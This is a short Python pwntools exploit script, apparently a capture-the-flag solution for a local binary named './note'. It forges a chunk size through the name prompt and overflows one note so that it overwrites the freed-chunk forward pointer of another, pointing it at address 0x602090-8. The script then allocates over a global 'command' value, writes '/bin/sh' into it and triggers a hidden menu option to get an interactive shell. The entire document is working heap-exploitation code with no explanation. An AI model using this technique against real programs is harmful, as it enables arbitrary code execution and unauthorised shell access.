from pwn import *

context.log_level = True


p = process("./note")


p.recvuntil("Please leave your name :")
p.sendline(p64(0x0000000000000021))


def my_add(name , content):
    p.recvuntil("command:")
    p.sendline("1")
    p.recvuntil("name:")
    p.send(name)
    p.recvuntil("content:")
    p.send(content)

def edit(idx, name , content):
    p.recvuntil("command:")
    p.sendline("2")
    p.recvuntil("index")
    p.sendline(str(idx))
    p.recvuntil("name:")
    p.send(name)
    p.recvuntil("content:")
    p.send(content)


def delete(idx):
    p.recvuntil("command:")
    p.sendline("4")
    p.recvuntil("id")
    p.sendline(str(idx))

def key2(name, content):
    p.recvuntil("command:")
    p.sendline("1234")
    p.recvuntil("name:")
    p.send(name)
    p.recvuntil("content:")
    p.send(content)
  

if __name__=="__main__":
    key2('a\n', 'k\n')

    for i in range(8):
        if i == 7:
            my_add(str(i) + "\n", "a" * 32)  #进行覆盖
        else:
            my_add(str(i) + "\n", str(i) + "\n")

    delete(6)

    edit(7, p64(0x602090-8), "bbbb")  #修改chunk7的fd

    my_add("/bin/sh\x00", "x\n")
    my_add("/bin/sh\x00", "x\n")   #修改command

    p.recvuntil("command:")
    p.sendline("2333")

    p.interactive()



